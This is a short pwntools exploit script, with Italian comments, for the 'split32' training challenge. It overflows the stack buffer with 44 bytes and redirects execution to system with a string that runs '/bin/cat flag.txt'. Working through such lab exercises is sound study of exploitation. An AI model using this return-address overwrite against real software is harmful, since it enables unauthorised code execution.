from pwn import *

elf = ELF("./split32")

p = process("./split32")
p.recvline()

"""
    Effettuiamo la chiamata a system con parametro 'usefulString'. 
    Sovrascriviamo il return pointer come nell'esercizio precedente, aggiungiamo l'indirizzo di system e passiamo come parametro
    usefulString, cio√® il comando '/bin/cat flag.txt' per stampare la flag
"""

payload = b''
payload += p32(elf.symbols['system']) + p32(0) + p32(elf.symbols['usefulString'])


p.send(cyclic(44) + payload)
					   

p.interactive()
